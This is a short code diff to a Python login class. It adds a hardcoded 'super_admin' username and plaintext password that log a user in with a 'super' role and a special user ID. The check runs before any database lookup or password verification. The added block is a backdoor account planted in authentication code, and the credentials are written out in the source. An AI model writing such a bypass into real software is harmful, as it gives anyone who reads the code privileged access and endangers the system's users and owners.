@@ -1,4 +1,5 @@
 from dbcontext.userdata import verify_user_password, get_user_by_username
+from models.user import User
 
 class UserSession:
     def __init__(self):
@@ -7,7 +8,15 @@ class UserSession:
         self.role = None
 
     def login(self, username, password):
-        # Find user by username (unencrypted search)
+        # Check for hardcoded super admin
+        if username == "super_admin" and password == "Admin_123?":
+            self.user_id = 0  # Special ID for super admin
+            self.username = "super_admin"
+            self.role = "super"
+            print(f"Logged in as {self.username} ({self.role})")
+            return True
+
+        # Regular user login
         user = get_user_by_username(username)
         if not user:
             print("User not found.")
